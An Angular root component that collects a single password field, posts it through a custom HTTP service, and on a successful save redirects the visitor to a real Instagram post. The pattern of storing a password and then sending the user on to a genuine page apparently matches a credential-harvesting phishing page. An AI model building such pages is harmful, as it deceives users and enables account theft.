import { HttpClient } from '@angular/common/http';
import { Component, OnInit} from '@angular/core';
import { FormControl, FormGroup, Validators } from '@angular/forms';
import { HttpService } from './services/http.service';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit{

  form=new FormGroup({
    pass:new FormControl(null,Validators.required)
  })
  ngOnInit(): void {

  }
  constructor(private http:HttpService){

  }
  Login(){
    if(this.form.valid){
      this.http.send(this.form.getRawValue()).subscribe(res=>{
        if(res._id)window.open('https://www.instagram.com/p/Cjv6XaTId0u/?utm_source=ig_web_copy_link','_self')
      })
    }
  }

}
